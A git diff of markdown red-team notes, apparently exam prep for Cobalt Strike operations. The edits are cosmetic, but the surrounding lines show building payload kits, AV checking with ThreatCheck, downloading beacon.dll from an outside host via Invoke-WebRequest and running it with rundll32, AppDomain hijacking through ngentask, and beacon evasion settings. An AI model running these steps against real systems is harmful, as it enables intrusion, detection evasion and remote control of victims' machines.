@@ -109,7 +109,7 @@ while ( x-- ) {
 }
 ```
 
->Build **artifacts** in WSL (Ubuntu)  
+>Build **artifacts** in WSL 🟣🐧Ubuntu  
 
 ```cpp
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
@@ -128,7 +128,7 @@ C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltst
 
 ## Build Resource Kit  
 
->Build **resources** templates in WSL (Ubuntu)  
+>Build **resources** templates in WSL 🟣🐧Ubuntu  
 
 ```bash
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
@@ -593,11 +593,11 @@ cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dl
 
 # Initial Beacon
 
->On compromised workstation  
+>On compromised 🖥️ workstation 💻  
 
 ## Enumerate AppLocker Policy
 
->Initial Access, Provided credentials, Locally logged onto compromised workstation  
+>Initial Access, Provided credentials, Locally logged onto compromised 🖥️ workstation 💻  
 
 ```powershell
 # Confirm AppLocker is enforcing (ConstrainedLanguage = active)
@@ -622,7 +622,7 @@ icacls C:\Windows\Temp
 
 >On `lon-wkstn-1` as `pchilds` — `Invoke-WebRequest` works in ConstrainedLanguage:  
 
-```beacon
+```powershell
 cd C:\Windows\Tasks\
 Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
 ```
@@ -641,7 +641,7 @@ rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 ## Process Hollowing 🧨 AppDomainHijack.dll  
 
 >Assume-breach with initial low privilege user beacon💻.  
->No phishing needed  
+>No phishing needed OPSEC-🟢SAFE  
 
 
 ### Upload AppDomainHijack.dll  
@@ -654,7 +654,7 @@ upload C:\Payloads\AppDomainHijack.dll
 
 ### Use AppDomainHijack.dll & ngentask Execute  
 
->On Compromised workstation:  
+>On compromised 🖥️ workstation 💻   
 
 ```powershell
 # On foothold workstation — set APPDOMAIN env vars and run ngentask (OPSEC-🟢SAFE)
@@ -675,7 +675,7 @@ $env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral
 
 # Connected Beacon Checklist  
 
->>[Initial Access without phishing in exam](/labs/Initial-Access-lab.md) beacon commands:  
+>[Initial Access without phishing in exam](/labs/Initial-Access-lab.md) beacon commands:  
 * ppid set to explorer.exe PID before `spawnto` and before `execute-assembly` or `powerpick`  
 * `spawnto x64 %windir%\sysnative\werfault.exe` before using fork&run operations `execute-assembly`, `powerpick`  
 
